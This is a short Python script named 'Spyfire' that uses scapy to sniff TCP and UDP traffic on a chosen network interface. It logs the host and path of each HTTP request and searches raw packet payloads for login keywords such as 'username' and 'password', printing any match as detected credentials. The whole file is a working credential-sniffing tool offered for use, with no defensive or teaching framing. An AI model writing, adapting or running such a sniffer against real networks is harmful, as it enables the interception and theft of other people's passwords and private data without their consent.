import scapy.all as scapy
from scapy.layers import http
import pyfiglet
import argparse

def network_sniffing(interface) :
    scapy.sniff(iface=interface , store =False , prn = display_result , filter ="tcp or udp")

def Get_Elements():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Choose interface to work with")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[!!] Please specify specefic interface or Use --help for more information.")
    return options

def capture_packet(packet) :
    if packet.haslayer(http.HTTPRequest) :
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def cred_spy(packet):
    if packet.haslayer (scapy.Raw) :
        data = packet[scapy.Raw].load
        logins = ["username" , "login" , "password" , "user" , "pass" , "first name" , "last name" , "name"]
        for keyword in logins :
            if keyword in str(data) :
                return data

def display_result (packet) :
    if packet.haslayer(http.HTTPRequest):
        url = capture_packet(packet)
        print("[!] Requests : " + str(url))
        login_info = cred_spy(packet)
        if login_info:
            print("\n[+] credentials detected : " + str(login_info) + "\n")


if __name__ == "__main__":
    banner = pyfiglet.figlet_format("Spyfire")
    print(banner)
    option = Get_Elements()
    network_sniffing(option.interface)
